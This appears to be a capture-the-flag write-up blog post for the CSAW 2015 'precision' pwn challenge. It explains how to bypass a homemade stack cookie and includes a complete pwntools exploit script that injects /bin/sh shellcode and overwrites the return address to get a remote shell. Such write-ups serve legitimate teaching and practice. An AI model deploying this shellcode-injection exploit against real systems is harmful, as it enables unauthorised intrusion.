---
author: 4rbit3r
layout: post
title: 'Cookies are Delicious - CSAW 2015 Exploitation 100 Writeup'
categories:
- pwn
keywords: CTF, 
summary: CSAW 2015 pwn 100 challenge writeup
---

The binary prints out the address of the buffer during execution and also presents a blatant buffer overflow with the scanf(`%s`). Checking out the binary in gdb-peda showed that NX was disabled. So the scenario I thought was `Buffer overflow with ASLR on 
and possible return to shellcode.`

But the problem with this method is that a variable resembling a stack-cookie is placed at a higher memory address compared to the buffer. The program, before the epilogue, checks whether or not the value of this stack-cookie has been altered. If it has been altered, then the program calls exit() which renders our overflow useless.

So what we need to do is to overflow the buffer in such a way that the stack-cookie is overwritten with its original value itself. The cookie is at an offset of 128 bytes from the starting of the buffer and it is 10 bytes long.So the only thing left to do is to write a nice python code to do all this for us.

**Expecto Pythonum**

{% highlight python lineos %}
from pwn import *
context.binary="precision"
host="54.173.98.115"
port=1259
p=remote(host,port)
context.bits=32
msg=p.recvline()
print msg
buf_addr = int( msg[msg.find(":")+2:],16)#the address of buffer which is being printed onto the screen
print hex(buf_addr)
shellcode= "\x31\xc0\xb0\x30"
	   +"\x01\xc4\x30\xc0"
 	   +"\x50\x68\x2f\x2f"
	   +"\x73\x68\x68\x2f"
	   +"\x62\x69\x6e\x89"
	   +"\xe3\x89\xc1\xb0"
	   +"\xb0\xc0\xe8\x04"
	   +"\xcd\x80\xc0\xe8"
	   +"\x03\xcd\x80"
payload=shellcode
payload+="B"*(128-len(shellcode))
payload+=pack(0x475a31a5)+pack(0x40501555)+"\xe0\x85"  #the value of the stack-cookie
payload+="C"*10     #rest of padding required to reach saved instruction pointer
payload+=pack(buf_addr)
p.sendline(payload)
p.interactive()
{%endhighlight%}

....Aaaand Voila! Shell..
